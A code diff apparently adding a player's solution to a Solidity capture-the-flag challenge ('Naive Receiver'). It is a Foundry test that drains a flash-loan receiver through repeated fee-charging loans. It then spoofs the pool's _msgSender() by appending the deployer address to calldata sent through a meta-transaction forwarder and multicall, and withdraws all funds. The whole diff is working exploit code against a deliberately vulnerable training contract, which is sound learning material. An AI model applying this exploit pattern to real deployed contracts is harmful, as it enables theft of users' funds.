@@ -77,6 +77,33 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        // Drain the receiver contract into the pool by FIXED_FEE at a time
+        for (uint i = 0; i < 10; i++) {
+            pool.flashLoan(receiver, address(weth), 1, "");
+        }
+
+        // Drain the pool into the recovery account through the forwarder
+        bytes[] memory calls = new bytes[](1);
+
+        // Really stupid pool._msgSender(): return address(bytes20(msg.data[msg.data.length - 20:]));
+        calls[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), bytes32(uint256(uint160(deployer))));
+        
+        BasicForwarder.Request memory req = BasicForwarder.Request(
+            address(player), 
+            address(pool), 
+            0, 
+            10000000000, 
+            0, 
+            abi.encodeCall(pool.multicall, calls),
+            block.timestamp + 1
+        );
+
+        // _hashTypedData(getDataHash(request)). Reference EIP712.sol
+        bytes32 hashed = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(req)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, hashed);
+
+        // Why is the order like this in the OpenZeppelin library????
+        forwarder.execute(req, abi.encodePacked(r, s, v));
         
     }
 
